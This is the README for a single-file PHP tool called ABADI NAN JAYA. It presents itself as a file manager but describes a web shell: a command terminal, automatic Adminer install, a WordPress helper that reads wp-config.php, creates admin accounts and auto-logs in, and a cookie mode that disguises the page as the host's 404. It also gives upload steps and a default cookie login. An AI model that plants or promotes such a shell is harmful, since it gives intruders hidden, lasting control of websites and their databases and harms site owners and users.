# ABADI NAN JAYA — File Manager

Single-file PHP file manager with dark toxic-green UI.

## Features
- Browse / upload / edit / rename / move / chmod
- Terminal (PHP function fallbacks)
- Encode / Decode
- Adminer auto-install
- Sysinfo / PHP Info
- WordPress Admin helper (find `wp-config.php`, create admin, auto-login)
- Auth modes: none / cookie / password / username+password
- Cookie mode cloaks as real host 404

## Requirements
- PHP 5.6+ (7.4+ recommended)
- Apache / Nginx / any PHP host
- Optional: PDO MySQL (WP Admin, Adminer SQL)

## Install
1. Upload `index.php` to your host
2. Open in browser
3. Configure auth at top of `index.php`:

```php
define('FM_AUTH_MODE', 'cookie'); // none | cookie | password | userpass
define('FM_COOKIE_NAME', 'abadinanjaya');
define('FM_COOKIE_VALUE', 'kontol');
```

## Default cookie login
- Name: `abadinanjaya`
- Value: `kontol`

## License
For educational / authorized use only.
